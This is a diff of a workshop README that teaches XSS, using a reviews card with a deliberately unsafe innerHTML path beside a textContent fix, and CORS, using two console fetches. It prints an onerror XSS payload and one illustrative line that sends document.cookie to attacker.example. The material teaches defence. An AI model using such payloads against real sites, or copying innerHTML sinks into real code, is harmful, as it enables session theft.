@@ -1,164 +1,168 @@
-# Day 3, Demo 10 — "Don't trust the user, don't trust the page" (Frontend security)
+# Demo 10 — Don't trust the user, don't trust the page
 
-Companion artifacts for the tenth demo of Day 3. Full design:
-`../docs/superpowers/specs/2026-05-28-day3-demo10-frontend-security-design.md`.
+Every frontend has two leaky seams where strangers meet your app: the text a
+user types into your inputs, and the JSON your code reads back from other
+servers. Get either one wrong and someone else gets to run JavaScript in your
+users' sessions. This demo is the smallest possible look at both — a Swiggy
+reviews card that can be tricked into running an attacker's HTML, and a pair
+of API endpoints that show you which responses the browser will actually let
+your code read.
 
-A tiny Swiggy **restaurant-reviews** page with a review form that renders your
-input straight into the page. The big idea:
+## Setup
 
-> Anything a user types is **untrusted input**. If you drop it into the page with
-> `innerHTML`, the browser will happily run any HTML — including a `<script>`-like
-> payload — that the user smuggled in. That's **XSS**. And **CORS** is the
-> browser's matching rule on the *other* side: it won't hand JavaScript a
-> cross-origin response unless that server explicitly opted you in.
+**XSS half — use the iframe on the left.**
 
-Two ideas, one page: the input you render (XSS) and the responses you're allowed
-to read (CORS).
+1. Make sure **☠️ UNSAFE — `innerHTML`** is selected (it's the default).
+2. Type a normal review like `Great biryani!` and post it. It shows up in the
+   feed. Looks completely ordinary.
+3. Now post this as your "review":
+   ```html
+   <img src="x" onerror="alert('hacked')">
+   ```
+   An **alert box pops**. You did not write a button for that. The user's
+   *input* just ran JavaScript.
+4. Flip the toggle to **✅ SAFE — `textContent`** and post the same payload
+   again. No alert — the literal characters show up in the feed as text.
 
-## What's here
-
-- `index.html` — the reviews card: a review form, an UNSAFE/SAFE render toggle,
-  and the feed the reviews drop into.
-- `app.js` — two render paths: `addReviewUnsafe` (`element.innerHTML = userInput`,
-  deliberately vulnerable) and `addReviewSafe` (`element.textContent = userInput`,
-  safe by construction).
-- `style.css` — Swiggy-orange card styling (emoji poster, CSS gradients; offline).
-- `server.py` — FastAPI static server that logs every request (Demo 1/3 pattern).
-- `test_server.py` — pytest (serving, content-types, form/feed hooks, both render
-  paths present, request logging).
-- `requirements.txt` — `fastapi`, `uvicorn`, `httpx`, `pytest`.
-
-## Setup & run
-
-```bash
-cd day_3/demo_10
-python3 -m venv .venv && source .venv/bin/activate   # first time only
-pip install -r requirements.txt                       # first time only
-uvicorn server:app --host 127.0.0.1 --port 8000 --reload
-```
-
-Open `http://localhost:8000/` and keep the **Console** open.
-
-## Demo flow
-
-### 0. No Slido for this one
-
-The XSS payload popping an `alert('hacked')` is visceral enough — let the room
-*see* the script run rather than poll them first. Spend the airtime on the
-"in the real world this is `document.cookie`" beat instead.
-
-### 1. A normal review works fine
-
-Make sure the **☠️ UNSAFE — `innerHTML`** mode is selected (it's the default).
-Type a normal review:
-
-```
-Great biryani!
-```
-
-Post it. It shows up in the feed. Everything looks ordinary — this is exactly
-how a reviews feature is *supposed* to behave.
-
-### 2. The attack — type HTML instead of text
-
-Still in UNSAFE mode, post this as your "review":
-
-```html
-<img src="x" onerror="alert('hacked')">
-```
-
-An **alert box pops**. You didn't write a button for that — the *user's input*
-ran JavaScript. Explain what happened: the `<img>` points at a broken source
-`x`, the image fails to load, and the `onerror` handler fires — running whatever
-JS the attacker put there.
-
-> "I typed that into a *review box*. There's no `eval`, no script tag I added —
-> the page took a user's text and ran it as code. That's **Cross-Site
-> Scripting**, XSS. An `alert` is the harmless version. In the real world that
-> `onerror` would read **`document.cookie`** — your session token — and ship it
-> to the attacker's server. Now they're logged in as you."
-
-### 3. The fix — render text as text
-
-Flip the toggle to **✅ SAFE — `textContent`** and post the *exact same payload*:
-
-```html
-<img src="x" onerror="alert('hacked')">
-```
-
-No alert. The literal characters `<img src="x" onerror="alert('hacked')">` show
-up in the feed as **text**. Open the two functions in `app.js` side by side —
-the only difference is one line:
+**CORS half — use your browser's Console.** Open DevTools on **any tab that is
+NOT this workshop site** — `https://example.com`, `https://news.ycombinator.com`,
+a blank `about:blank`, whatever you have open. You need a different origin so
+the browser actually enforces CORS. Paste:
 
 ```js
-li.innerHTML = text;   // UNSAFE: browser parses it as HTML
-li.textContent = text; // SAFE:   browser renders it as literal text
-```
-
-> "`innerHTML` says *'this is markup, parse it.'* `textContent` says *'this is
-> text, show it.'* The user's input never changed — only how we put it on the
-> page. **`textContent` is the default you reach for.**"
-
-### 4. How React handles this
-
-> "You will rarely touch `innerHTML` again, because React escapes for you. When
-> you write `{userInput}` in JSX, React renders it as text — escaped by default,
-> exactly like `textContent`. The only way to get the unsafe behaviour back is to
-> explicitly call **`dangerouslySetInnerHTML`** — and the scary name is the
-> point. It's the one warning sign you'll almost never need. If you find yourself
-> reaching for it, stop and ask why."
-
-### 5. CORS — the other half of "don't trust"
-
-Now flip to the response side. This expands the seed from the rendering demo
-(Demo 5). Open the **Console** on *any* page (this one is fine) and try to fetch
-a cross-origin API that doesn't allow your origin:
-
-```js
-fetch("https://api.github.com/repos/anthropics/anthropic-sdk-python")
+// Should ERROR — the server sent no Access-Control-Allow-Origin header.
+fetch("https://teach-site.vercel.app/api/cors-demo/blocked")
   .then((r) => r.json())
-  .then(console.log);
+  .then(console.log)
+  .catch(console.error);
+
+// Should WORK — the server set Access-Control-Allow-Origin: *.
+fetch("https://teach-site.vercel.app/api/cors-demo/allowed")
+  .then((r) => r.json())
+  .then(console.log)
+  .catch(console.error);
 ```
 
-GitHub's API actually *does* allow cross-origin reads, so to **see the red
-error** use an endpoint that doesn't send the header — for example:
+> If you're running the workshop site locally, swap the host for
+> `http://localhost:3000`. Replace `teach-site.vercel.app` with whatever your
+> tutor's site URL is if it differs.
 
-```js
-fetch("https://api.zomato.com/").then((r) => r.text());
+The first fetch turns red in the Console: *"...blocked by CORS policy..."*.
+The second one prints the JSON. Same server, same request — only difference
+is one response header.
+
+## Concepts
+
+**1. Any user input that reaches `innerHTML` is a code-execution sink.** The
+browser does not know your input box is "just for reviews." It only knows you
+asked it to parse a string as HTML. If that string contains an `<img>` with an
+`onerror`, the browser dutifully runs the handler. In the real world, that
+`alert` would be `fetch('https://attacker.example/?c=' + document.cookie)`.
+
+**2. `textContent` is the safe default.** It tells the browser *"this is text,
+draw it."* No parsing, no scripts, no surprises. React does this for you: when
+you write `{userInput}` in JSX, React escapes by default — it's `textContent`
+under the hood. The only way to opt back into the dangerous behaviour is to
+explicitly call `dangerouslySetInnerHTML`, and the scary name is on purpose.
+
+**3. CORS is enforced by the browser, not the network.** The request to the
+cross-origin server *was sent*. The server *answered*. The bytes came back.
+Then the browser looked at the response headers, didn't find an
+`Access-Control-Allow-Origin` that matches your origin, and refused to hand
+the response to your JavaScript. The network is fine. The browser is the
+gatekeeper.
+
+**4. "Same origin" is `scheme + host + port`.** `https://swiggy.com` and
+`https://api.swiggy.com` are *different origins*. So is
+`http://swiggy.com` vs `https://swiggy.com`. So is port 3000 vs 8000.
+
+**5. CORS lives on the server's response.** The client doesn't configure it;
+the server does, by sending an `Access-Control-Allow-Origin` header. That's
+why both endpoints in this demo look identical — except for one header.
+
+## Diagrams
+
+A cross-origin fetch, step by step. Notice the browser is the one making the
+final call about whether your JS gets to see the response:
+
+```mermaid
+sequenceDiagram
+  participant JS as Your JS<br/>(origin A)
+  participant Browser
+  participant Server as Other server<br/>(origin B)
+
+  JS->>Browser: fetch("https://B/data")
+  Browser->>Server: GET /data<br/>Origin: A
+  Server-->>Browser: 200 OK<br/>{"ok": true}<br/>(maybe Access-Control-Allow-Origin)
+
+  alt Header present and matches A
+    Browser-->>JS: Response object (you can .json() it)
+  else No matching header
+    Browser--xJS: TypeError: blocked by CORS policy
+    Note over Browser,JS: The bytes arrived.<br/>The browser refused to share them.
+  end
 ```
 
-You get a red **CORS error** in the Console:
-*"...has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header..."*
+The two render paths on the page — same input, different sink:
 
-Explain what *actually* happened — this is the part everyone gets wrong:
+<svg viewBox="0 0 600 260" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Split brain: UNSAFE innerHTML path versus SAFE textContent path" style="font-family: ui-sans-serif, system-ui, sans-serif;">
+  <rect x="0" y="0" width="600" height="260" fill="#fff3e6"/>
+  <line x1="300" y1="20" x2="300" y2="240" stroke="#fc8019" stroke-width="2" stroke-dasharray="6 4"/>
 
-> "The request **was sent**. The server **answered**. The response came back to
-> the browser. Then the browser looked at the response headers, searched for an
-> **`Access-Control-Allow-Origin`** header naming *our* origin, didn't find it,
-> and **refused to hand the data to our JavaScript**. The server has to *opt in*
-> by sending that header. CORS isn't the server blocking you — it's the
-> **browser** refusing to share a cross-origin response your JS wasn't invited
-> to read."
+  <text x="150" y="30" text-anchor="middle" font-size="14" font-weight="700" fill="#1c1c1c">UNSAFE · innerHTML</text>
+  <text x="450" y="30" text-anchor="middle" font-size="14" font-weight="700" fill="#1c1c1c">SAFE · textContent</text>
 
-Why the browser bothers:
+  <g font-size="12" fill="#1c1c1c">
+    <rect x="40" y="50" width="220" height="34" rx="6" fill="#fff" stroke="#fc8019"/>
+    <text x="150" y="71" text-anchor="middle">User types &lt;img onerror=...&gt;</text>
 
-> "Imagine you're logged into your bank in one tab. You open a sketchy site in
-> another. Without this rule, that site's JavaScript could `fetch` your bank's
-> API — your browser would attach your bank cookies automatically — and read
-> your balance. CORS is the browser saying *'a cross-origin server only shares
-> its data with origins it explicitly trusts.'* It's protecting **the user from
-> the page**, which is the same theme as XSS — just from the other direction."
+    <rect x="40" y="104" width="220" height="34" rx="6" fill="#fff" stroke="#fc8019"/>
+    <text x="150" y="125" text-anchor="middle">el.innerHTML = input</text>
 
-## Pre-session checklist
+    <rect x="40" y="158" width="220" height="34" rx="6" fill="#fff" stroke="#fc8019"/>
+    <text x="150" y="179" text-anchor="middle">Browser parses as HTML</text>
 
-- [ ] `.venv` exists and `pip install -r requirements.txt` succeeds.
-- [ ] `python -m pytest -q` passes (7 tests).
-- [ ] `uvicorn server:app ...` runs; reviews card renders at
-      `http://localhost:8000/`.
-- [ ] In UNSAFE mode: "Great biryani!" posts normally; the
-      `<img src="x" onerror=...>` payload **pops an alert**.
-- [ ] In SAFE mode: the same payload renders as **literal text**, no alert.
-- [ ] A cross-origin `fetch` in the Console produces a **red CORS error**.
-      Confirm the chosen URL still lacks the header (APIs change) — keep a backup
-      URL ready, since this beat needs live internet.
-- [ ] Display sleep / Caffeinate enabled for the session duration.
+    <rect x="40" y="212" width="220" height="34" rx="6" fill="#fc8019" stroke="#fc8019"/>
+    <text x="150" y="233" text-anchor="middle" fill="#fff" font-weight="700">Attacker's JS runs</text>
+  </g>
+
+  <g font-size="12" fill="#1c1c1c">
+    <rect x="340" y="50" width="220" height="34" rx="6" fill="#fff" stroke="#fc8019"/>
+    <text x="450" y="71" text-anchor="middle">User types &lt;img onerror=...&gt;</text>
+
+    <rect x="340" y="104" width="220" height="34" rx="6" fill="#fff" stroke="#fc8019"/>
+    <text x="450" y="125" text-anchor="middle">el.textContent = input</text>
+
+    <rect x="340" y="158" width="220" height="34" rx="6" fill="#fff" stroke="#fc8019"/>
+    <text x="450" y="179" text-anchor="middle">Browser draws literal text</text>
+
+    <rect x="340" y="212" width="220" height="34" rx="6" fill="#fff" stroke="#fc8019"/>
+    <text x="450" y="233" text-anchor="middle" font-weight="700">Shows as harmless string</text>
+  </g>
+
+  <g stroke="#fc8019" stroke-width="1.5" fill="none">
+    <path d="M150 84 L150 104"/><path d="M150 138 L150 158"/><path d="M150 192 L150 212"/>
+    <path d="M450 84 L450 104"/><path d="M450 138 L450 158"/><path d="M450 192 L450 212"/>
+  </g>
+</svg>
+
+## Takeaways
+
+- **Never put untrusted text into `innerHTML`.** If you're building a string
+  of HTML by hand, you're one stray user input away from XSS.
+- **`textContent` (and React's `{userInput}`) is the default.** You should
+  have to *try* to render markup, not try to escape it.
+- **`dangerouslySetInnerHTML` is a code smell.** If a teammate adds it, ask:
+  is this string really HTML, and where did every character of it come from?
+- **CORS is a browser policy, not a network policy.** Curl, Postman, and your
+  server-to-server fetches don't care about CORS — they were never the threat
+  model. CORS protects *users* whose browsers carry their cookies everywhere.
+- **CORS is configured on the response, by the server.** You cannot "fix
+  CORS" from the client. If you need a cross-origin read, the other server
+  has to send the header — or you proxy the call through your own backend.
+- **Same-origin reads always work.** That's why a same-origin fetch from
+  inside this workshop site to `/api/cors-demo/blocked` succeeds: there's no
+  cross-origin check to fail.
+- **Both attacks share a theme.** XSS is "don't trust what comes *in*"; CORS
+  is "don't let pages read what they weren't invited to." The browser is
+  trying very hard to protect your users from the page they happen to be on.
